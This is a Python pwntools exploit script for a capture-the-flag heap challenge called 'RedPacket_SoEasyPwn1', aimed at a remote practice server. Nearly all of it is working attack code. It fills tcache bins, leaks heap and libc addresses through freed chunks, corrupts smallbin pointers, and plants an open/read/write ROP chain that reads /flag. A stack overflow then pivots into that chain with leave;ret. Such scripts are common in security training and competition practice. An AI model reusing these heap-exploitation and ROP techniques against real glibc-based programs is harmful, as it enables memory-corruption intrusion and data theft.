from pwn import *

r = remote("node4.buuoj.cn", 28684)
#r = process("./RedPacket_SoEasyPwn1/RedPacket_SoEasyPwn1")

context(log_level = 'debug', arch = 'amd64', os = 'linux')
DEBUG = 0
if DEBUG:
    gdb.attach(r,
    '''
    where
    ''')

# elf = ELF("./RedPacket_SoEasyPwn1/RedPacket_SoEasyPwn1")
libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/19-64-libc-2.29.so')
one_gadget_19 = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]

menu = "Your input: "
def add(index, choice, content):
    r.recvuntil(menu)
    r.sendline('1')
    r.recvuntil("Please input the red packet idx: ")
    r.sendline(str(index))
    r.recvuntil("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ")
    r.sendline(str(choice))
    r.recvuntil("Please input content: ")
    r.send(content)

def delete(index):
    r.recvuntil(menu)
    r.sendline('2')
    r.recvuntil("Please input the red packet idx: ")
    r.sendline(str(index))


def edit(index, content):
    r.recvuntil(menu)
    r.sendline('3')
    r.recvuntil("Please input the red packet idx: ")
    r.sendline(str(index))
    r.recvuntil("Please input content: ")
    r.send(content)

def show(index):
    r.recvuntil(menu)
    r.sendline('4')
    r.recvuntil("Please input the red packet idx: ")
    r.sendline(str(index))

# fill full tcache size 0x410
for i in range(7):
    add(0,4,'Chunk0')
    delete(0)

# fill 6 in tcache size 0x100
for i in range(6):
    add(1,2,'Chunk1')
    delete(1)


show(0)
last_chunk_addr = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
heap_addr = last_chunk_addr - 0x26C0
success("heap_base:"+hex(heap_addr))

add(2,4,'Chunk2')
add(3,3,'Chunk3')
delete(2)
show(2)
malloc_hook = u64(r.recvuntil('\n').strip().ljust(8, '\x00')) - 0x60 - 0x10
libc.address = malloc_hook - libc.sym['__malloc_hook']
success("libc:"+hex(libc.address))


add(3,3,'Chunk3')
add(3,3,'Chunk3') #get smallbin1

add(4,4,'Chunk4')
add(5,4,'Chunk5')
delete(4)
add(5,3,'Chunk5')
add(5,3,'Chunk5') # get smallbin2


payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
edit(4,payload)

add(3,2,'Chunk_3') # get smallbin


pop_rdi_ret = libc.address + 0x0000000000026542
pop_rsi_ret = libc.address + 0x0000000000026f9e
pop_rdx_ret = libc.address + 0x000000000012bda6
file_name_addr = heap_addr + 0x0000000000004A40
flag_addr = file_name_addr + 0x0000000000000200
ROP_chain  = '/flag\x00\x00\x00'
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(file_name_addr)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(0)
ROP_chain += p64(libc.symbols['open'])
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(3)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc.symbols['read'])
ROP_chain += p64(pop_rdi_ret)
ROP_chain += p64(1)
ROP_chain += p64(pop_rsi_ret)
ROP_chain += p64(flag_addr)
ROP_chain += p64(pop_rdx_ret)
ROP_chain += p64(0x40)
ROP_chain += p64(libc.symbols['write'])

add(4,4,ROP_chain)

leave_ret = libc.address + 0x0000000000058373
r.recvuntil('Your input: ')
r.sendline('666')
r.recvuntil('What do you want to say?')
r.sendline('A'*0x80 + p64(file_name_addr) + p64(leave_ret))

r.interactive()